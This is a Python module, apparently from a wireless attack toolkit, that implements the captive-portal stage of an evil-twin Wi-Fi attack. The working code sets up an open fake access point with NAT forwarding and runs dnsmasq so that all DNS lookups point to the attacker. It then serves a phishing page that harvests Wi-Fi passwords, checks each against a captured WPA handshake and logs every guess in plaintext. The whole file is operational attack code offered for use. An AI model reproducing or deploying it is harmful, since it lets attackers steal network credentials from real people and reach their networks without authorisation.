"""Captive-portal server for the EvilTwin open-twin attack.

Spins up an OPEN-mode FakeAP on the twin interface, runs dnsmasq for DNS
redirection, and serves a phishing page that captures Wi-Fi passwords and
validates them against the captured handshake in real time.
"""
from __future__ import annotations

import logging
import os
import shutil
import subprocess
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from typing import Callable, Optional
from urllib.parse import parse_qs

from airscope.campaigns.eviltwin.portal_page import render_error, render_portal, render_success
from airscope.crack.handshake import CrackablePair, Handshake, mic_matches

log = logging.getLogger(__name__)

_PORTAL_IP = "192.168.4.1"
_PORTAL_DHCP_START = "192.168.4.10"
_PORTAL_DHCP_END = "192.168.4.200"
_HTTP_PORT = 8080
_DNSMASQ_LEASE_FILE = "/tmp/airscope-dnsmasq.leases"
_DNSMASQ_CONF = "/tmp/airscope-dnsmasq.conf"


def _resolve_os_iface(wlan_iface) -> Optional[str]:
    """Resolve an airscope WlanInterface to its Linux OS interface name via /sys/class/net/."""
    bus = getattr(wlan_iface, "bus", None)
    address = getattr(wlan_iface, "address", None)
    if bus is None or address is None:
        return None
    net = Path("/sys/class/net")
    if not net.is_dir():
        return None
    for entry in net.iterdir():
        dev = entry / "device"
        if not dev.is_symlink():
            continue
        try:
            usb_path = dev.resolve()
            if str(bus) in str(usb_path) and f"{address:04x}" in usb_path.name.lower():
                return entry.name
        except (OSError, ValueError):
            continue
    return None


class _PortalHandler(BaseHTTPRequestHandler):
    """HTTP request handler that serves the phishing page and validates passwords."""

    password_callback: Optional[Callable[[str, str], bool]] = None
    ssid: str = ""

    def do_GET(self) -> None:
        self._send_page(200, render_portal(self.ssid))

    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode()
        params = parse_qs(body)
        password = params.get("password", [""])[0]

        if not password:
            self._send_page(200, render_error("Password cannot be empty.", self.ssid))
            return

        if self.password_callback is not None and self.password_callback(password, self.ssid):
            self._send_page(200, render_success(password, self.ssid))
        else:
            self._send_page(200, render_error("Incorrect password. Please try again.", self.ssid))

    def log_message(self, fmt: str, *args: object) -> None:
        log.debug("HTTP %s", fmt % args)

    def _send_page(self, code: int, html: str) -> None:
        body = html.encode()
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


class CaptivePortal:
    """Manages the OPEN twin AP, DNS spoofing, and captive-portal HTTP server."""

    def __init__(
        self,
        wlan_iface,
        ssid: str,
        bssid: str,
        channel: int,
        hs: Handshake,
        pair: CrackablePair,
        log_fn: Optional[Callable[[str], None]] = None,
        on_password: Optional[Callable[[str], None]] = None,
    ) -> None:
        self.wlan_iface = wlan_iface
        self.os_iface = _resolve_os_iface(wlan_iface) or getattr(wlan_iface, "name", "")
        self.ssid = ssid
        self.bssid = bssid
        self.channel = channel
        self.hs = hs
        self.pair = pair
        self._log = log_fn or (lambda msg: log.info(msg))
        self._on_password = on_password
        self._httpd: Optional[HTTPServer] = None
        self._http_thread: Optional[threading.Thread] = None
        self._dnsmasq_proc: Optional[subprocess.Popen] = None
        self._running = False
        self._validated = False
        self._has_ap = False

    def _validate_password(self, password: str, ssid: str) -> bool:
        if self._validated:
            return False
        try:
            if mic_matches(password, ssid, self.hs, pair=self.pair):
                self._validated = True
                self._log(f"[evil-twin] password accepted: {password}")
                if self._on_password is not None:
                    self._on_password(password)
                return True
        except Exception:
            log.debug("mic_matches raised for password=%s", password, exc_info=True)
        self._log(f"[evil-twin] wrong password: {password}")
        return False

    def start(self) -> None:
        if not self.os_iface:
            self._log("[captive-portal] WARN: could not resolve OS interface; skipping AP setup")
        else:
            self._setup_ap_interface()
        self._start_http()
        self._running = True
        self._log(f"[captive-portal] {self.ssid}  http://{_PORTAL_IP}:{_HTTP_PORT}")

    def stop(self) -> None:
        self._running = False
        self._stop_http()
        self._stop_dnsmasq()
        if self._has_ap:
            self._teardown_ap_interface()

    @property
    def is_validated(self) -> bool:
        return self._validated

    def _setup_ap_interface(self) -> None:
        iface = self.os_iface
        self._log(f"[captive-portal] configuring {iface} for AP mode")
        if os.uname().sysname == "Darwin":
            self._setup_ap_darwin(iface)
        else:
            self._setup_ap_linux(iface)
        self._has_ap = True
        self._start_dnsmasq()

    def _setup_ap_linux(self, iface: str) -> None:
        for cmd in [
            ["ip", "link", "set", iface, "down"],
            ["ip", "link", "set", iface, "up"],
            ["ip", "addr", "flush", "dev", iface],
            ["ip", "addr", "add", f"{_PORTAL_IP}/24", "dev", iface],
            ["ip", "link", "set", iface, "up"],
        ]:
            try:
                subprocess.run(cmd, check=True, capture_output=True, timeout=5)
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                self._log(f"[captive-portal] WARN: {' '.join(cmd)} failed")
        for cmd in [
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            ["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", iface, "-j", "MASQUERADE"],
            ["iptables", "-A", "FORWARD", "-i", iface, "-j", "ACCEPT"],
        ]:
            try:
                subprocess.run(cmd, check=True, capture_output=True, timeout=5)
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                self._log(f"[captive-portal] WARN: {' '.join(cmd)} failed")

    def _setup_ap_darwin(self, iface: str) -> None:
        for cmd in [
            ["sudo", "ifconfig", iface, "down"],
            ["sudo", "ifconfig", iface, _PORTAL_IP, "netmask", "255.255.255.0", "up"],
        ]:
            try:
                subprocess.run(cmd, check=True, capture_output=True, timeout=5)
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                self._log(f"[captive-portal] WARN: {' '.join(cmd)} failed")

    def _start_dnsmasq(self) -> None:
        conf = (
            f"interface={self.os_iface}\n"
            f"dhcp-range={_PORTAL_DHCP_START},{_PORTAL_DHCP_END},255.255.255.0,12h\n"
            f"dhcp-option=option:router,{_PORTAL_IP}\n"
            f"dhcp-option=option:dns-server,{_PORTAL_IP}\n"
            f"address=/#/{_PORTAL_IP}\n"
            f"no-resolv\n"
            f"no-poll\n"
            f"log-queries\n"
            f"leasefile={_DNSMASQ_LEASE_FILE}\n"
        )
        with open(_DNSMASQ_CONF, "w") as f:
            f.write(conf)

        dnsmasq = shutil.which("dnsmasq")
        if dnsmasq is None:
            self._log("[captive-portal] WARN: dnsmasq not found; DNS redirect disabled")
            return

        try:
            self._dnsmasq_proc = subprocess.Popen(
                [dnsmasq, "-C", _DNSMASQ_CONF, "--no-daemon"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            self._log("[captive-portal] dnsmasq started")
        except Exception:
            self._log("[captive-portal] WARN: failed to start dnsmasq")
            log.debug("dnsmasq start failed", exc_info=True)

    def _start_http(self) -> None:
        _PortalHandler.ssid = self.ssid
        _PortalHandler.password_callback = self._validate_password

        try:
            self._httpd = HTTPServer(("0.0.0.0", _HTTP_PORT), _PortalHandler)
        except OSError:
            self._log("[captive-portal] ERROR: port 80 unavailable")
            return

        self._http_thread = threading.Thread(target=self._httpd.serve_forever, daemon=True)
        self._http_thread.start()
        self._log(f"[captive-portal] HTTP server on port {_HTTP_PORT}")

    def _stop_http(self) -> None:
        if self._httpd is not None:
            self._httpd.shutdown()
            self._httpd = None
            self._log("[captive-portal] HTTP server stopped")

    def _stop_dnsmasq(self) -> None:
        if self._dnsmasq_proc is not None:
            self._dnsmasq_proc.terminate()
            try:
                self._dnsmasq_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._dnsmasq_proc.kill()
            self._dnsmasq_proc = None
            self._log("[captive-portal] dnsmasq stopped")

    def _teardown_ap_interface(self) -> None:
        iface = self.os_iface
        if os.uname().sysname == "Darwin":
            for cmd in [
                ["sudo", "ifconfig", iface, "down"],
            ]:
                try:
                    subprocess.run(cmd, check=False, capture_output=True, timeout=5)
                except Exception:
                    pass
        else:
            for cmd in [
                ["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", iface, "-j", "MASQUERADE"],
                ["iptables", "-D", "FORWARD", "-i", iface, "-j", "ACCEPT"],
                ["ip", "addr", "flush", "dev", iface],
            ]:
                try:
                    subprocess.run(cmd, check=False, capture_output=True, timeout=5)
                except Exception:
                    pass
        try:
            os.unlink(_DNSMASQ_CONF)
        except FileNotFoundError:
            pass
